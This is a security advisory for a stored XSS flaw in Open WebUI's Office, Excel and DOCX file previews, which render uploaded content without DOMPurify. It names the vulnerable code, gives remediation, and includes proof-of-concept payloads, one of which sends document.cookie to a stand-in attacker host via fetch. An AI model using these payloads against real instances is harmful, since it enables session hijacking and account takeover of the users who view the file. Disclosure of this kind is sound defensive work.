# [M] Open WebUI has stored XSS via unsanitized Office/Excel/DOCX file preview rendering ({@html} without DOMPurify)

## Summary
Severity: Medium
Advisory: GHSA-hcwp-82g6-8wxc
CVE: CVE-2026-45318
CWE: CWE-79
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N (CVSS_V3)
Published: 2026-05-14
Source: https://github.com/advisories/GHSA-hcwp-82g6-8wxc
Type: github-advisory

## Affected
- PyPI: `open-webui` — affected >=0 <0.9.3

## Details
## Related advisory

This advisory tracks a regression of the original Excel-preview XSS that was 
publicly disclosed and patched under [GHSA-jwf8-pv5p-vhmc](https://github.com/open-webui/open-webui/security/advisories/GHSA-jwf8-pv5p-vhmc) 
(patched in v0.8.0). The same root cause — `XLSX.utils.sheet_to_html()` output 
rendered via `{@html excelHtml}` without DOMPurify — was reintroduced sometime 
after v0.8.0 and is exploitable again as of v0.8.12 and through the version 
range listed above. This advisory additionally covers the related 
`fileOfficeHtml` sink in `src/lib/components/chat/FileNav.svelte` 
(lines 458 and 1285) which was not part of the jwf8 advisory's scope.

## Summary

Open WebUI renders user-uploaded Office files (Excel, DOCX) as HTML using Svelte's `{@html}` directive **without DOMPurify sanitization**. While the codebase has DOMPurify available and uses it in 9 out of 23 `{@html}` locations (39%), three file-preview rendering paths bypass it entirely, allowing Stored XSS when a user uploads a malicious document.

This is a classic **defense propagation failure**: the sanitization primitive exists in the codebase but is not consistently applied to all rendering surfaces.

## Root Cause

**The defense primitive exists**: `DOMPurify.sanitize()` is imported and used in components like `General.svelte`, `MarkdownInlineTokens.svelte`, `Banner.svelte`, and `SVGPanZoom.svelte`.

**But 3 file-preview paths skip it**:

### Occurrence 1: FilePreview.svelte — Office HTML

**File**: `src/lib/components/chat/FileNav/FilePreview.svelte` line 324

```svelte
{:else if fileOfficeHtml !== null}
    <div class="office-preview overflow-auto flex-1 min-h-0">
        {@html fileOfficeHtml}   <!-- NO DOMPurify! -->
    </div>
```

`fileOfficeHtml` is generated from user-uploaded Office files (PPT, DOC, etc.) converted to HTML. The HTML is rendered directly without sanitization.

### Occurrence 2: FileItemModal.svelte — Excel HTML

**File**: `src/lib/components/common/FileItemModal.svelte` line 560

```svelte
{@html excelHtml}   <!-- NO DOMPurify! -->
```

`excelHtml` is generated from user-uploaded Excel files converted to HTML tables. No sanitization applied.

### Occurrence 3: FileItemModal.svelte — DOCX HTML

**File**: `src/lib/components/common/FileItemModal.svelte` line 590

```svelte
{@html docxHtml}   <!-- NO DOMPurify! -->
```

`docxHtml` is generated from user-uploaded DOCX files converted to HTML. No sanitization applied.

## Contrast with Sanitized Paths

For comparison, the same codebase correctly sanitizes in other locations:

```svelte
<!-- MarkdownInlineTokens.svelte:130 — SAFE -->
{@html DOMPurify.sanitize(token.text, { ADD_ATTR: ['target'] })}

<!-- General.svelte:276 — SAFE -->
{@html DOMPurify.sanitize($config?.license_metadata?.html)}

<!-- Banner.svelte:103 — SAFE -->
{@html DOMPurify.sanitize(marked.parse(...))}
```

## Defense Propagation Gap

| Metric | Value |
|--------|-------|
| Total `{@html}` usages | 23 |
| With DOMPurify | 9 (39%) |
| **Without DOMPurify** | **14 (61%)** |
| Confirmed exploitable (file preview) | **3** |

The remaining 11 unsanitized `{@html}` usages include syntax highlighting (`hljs`), KaTeX math rendering, and `marked.parse()` with `sanitizeResponseContent()` pre-processing — these have varying levels of inherent safety but still represent inconsistent defense application.

## Tested Version

- Open WebUI v0.8.12 (commit `9bd8425`, tag `v0.8.12`)

## Steps to Reproduce

### PoC 1: Malicious Excel File

1. Create a `.xlsx` file with a cell containing:
   ```
   <img src=x onerror="alert(document.cookie)">
   ```
   (Using a library like openpyxl to inject raw HTML into cell values)

2. Upload the file to Open WebUI via the chat file upload

3. When any user previews the file → `excelHtml` renders the injected HTML → **XSS fires**

### PoC 2: Malicious DOCX File

1. Create a `.docx` file with embedded HTML:
   ```xml
   <w:r><w:t><![CDATA[<svg onload="fetch('https://attacker.com/steal?c='+document.cookie)">]]></w:t></w:r>
   ```

2. Upload to Open WebUI

3. File preview renders `docxHtml` → **XSS fires**

### PoC 3: Verify Rendering Path

```javascript
// In browser devtools on Open WebUI, after uploading a file:
// The file preview component renders:
//   FileItemModal → {@html excelHtml}  // no DOMPurify
//   FileItemModal → {@html docxHtml}   // no DOMPurify
//   FilePreview   → {@html fileOfficeHtml}  // no DOMPurify

// Compare with safe path:
//   NotebookView → {@html DOMPurify.sanitize(toStr(output.data['text/html']))}  // sanitized!
```

## Impact

- **Stored XSS** — malicious file is stored server-side, XSS fires for every user who previews it
- **Session hijacking** via `document.cookie` theft
- **Account takeover** — attacker can perform actions as the victim user
- **Data exfiltration** — read chat history, API keys, uploaded documents
- **Multi-user environments** — shared Open WebUI instances are especially vulnerable (one malicious upload affects all viewers)
- **Defense propagation failure** — DOMPurify is available and used elsewhere, but not applied to file preview paths

## Suggested Remediation

Apply DOMPurify to all three file preview paths:

```svelte
<!-- FilePreview.svelte:324 — FIX -->
{@html DOMPurify.sanitize(fileOfficeHtml)}

<!-- FileItemModal.svelte:560 — FIX -->
{@html DOMPurify.sanitize(excelHtml)}

<!-- FileItemModal.svelte:590 — FIX -->
{@html DOMPurify.sanitize(docxHtml)}
```

Alternatively, adopt a **defense-by-default pattern**: create a wrapper component that always applies DOMPurify, making unsanitized `{@html}` usage a code review flag.

## References

- CWE-79: Improper Neutralization of Input During Web Page Generation (XSS)
- OWASP XSS Prevention Cheat Sheet
- GHSA-x75g-rp99-qqpx: Previous Open WebUI report (DNS rebinding TOCTOU, different vulnerability class)

## References
- https://github.com/open-webui/open-webui/security/advisories/GHSA-hcwp-82g6-8wxc
- https://github.com/open-webui/open-webui/security/advisories/GHSA-jwf8-pv5p-vhmc
- https://nvd.nist.gov/vuln/detail/CVE-2026-45318
- https://github.com/open-webui/open-webui
- https://github.com/open-webui/open-webui/releases/tag/v0.9.3
